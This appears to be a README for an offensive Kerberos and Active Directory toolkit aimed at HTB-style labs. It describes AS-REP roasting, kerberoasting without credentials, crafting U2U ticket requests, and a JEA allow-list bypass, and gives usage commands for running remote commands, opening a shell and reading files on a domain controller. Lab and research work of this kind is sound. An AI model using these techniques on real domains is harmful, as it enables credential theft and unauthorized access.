# kerberos-playground

## asrep_roast.py

Classic AS-REP roast attack.

## getst_asrep.py

You can kerberoast service accounts without knowing any credentials if you have access to an account that has `UF_DONT_REQUIRE_PREAUTH` set.

## u2u.py

This script simulates an U2U authentication exchange by crafting a specific `TGS-REQ` according to RFC 4120. Use this for research purpose and undersanding how U2U works. 

```bash
Send a U2U TGS-REQ that embeds an additional TGT

options:
  -h, --help            show this help message and exit
  -s, --service SERVICE
                        Target SPN/UPN (e.g. user@domain or cifs/server)
  -c, --client-ccache CLIENT_CCACHE
                        Client ccache containing the authenticating TGT (default: KRB5CCNAME)
  -a, --additional-ccache ADDITIONAL_CCACHE
                        'Server' ccache that holds the additional TGT to put in additional-tickets
  --additional-principal ADDITIONAL_PRINCIPAL
                        Specific principal to pull from the additional cache (defaults to the first credential)
  -r, --realm REALM     Kerberos realm/AD domain (defaults to the realm from the client cache)
  --dc-ip DC_IP         KDC IP/hostname override
  --etype ETYPE         Extra encryption type IDs to request (can be repeated)
  --save SAVE           Path to write the resulting service ticket as a ccache
  --renew               Set the RENEW option in the TGS-REQ
  --debug               Enable verbose output
```

## jea_bypass.py

JEA endpoints configured with LanguageMode = 'ConstrainedLanguage' (instead of 'NoLanguage') are bypassable. While VisibleCmdlets restricts interactive sessions to a defined allow-list, pypsrp's PowerShell.add_script() sends commands via the PSRP protocol at a lower level. Wrapping commands in & { ... } script blocks allows execution of cmdlets outside the VisibleCmdlets list. ConstrainedLanguageMode still applies (no arbitrary .NET calls), but basic PowerShell cmdlets (Get-ChildItem, Get-Content, whoami, etc.) work fine.

```bash
USAGE:
    # Single command
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'whoami'

    # Interactive shell loop
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        --shell

    # Password auth (no Kerberos)
    python3 jea_bypass.py -t dc1.target.htb -u 'DOMAIN\user' -p 'Password1' \
        -e 'restricted' -c 'Get-Content C:\flag.txt'

    # Read a file
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'Get-Content "C:\\Users\\svc\\Documents\\secret.txt"'

    # List a directory
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'ls "C:\\Users\\svc\\Documents\\"'

    # Check writable DACL objects (useful for AD priv-esc)
    python3 jea_bypass.py -t dc1.target.htb -u 'svc$@REALM.HTB' -e 'restricted' \
        -c 'Get-ADUser -Filter * | Select-Object Name,SamAccountName'
```
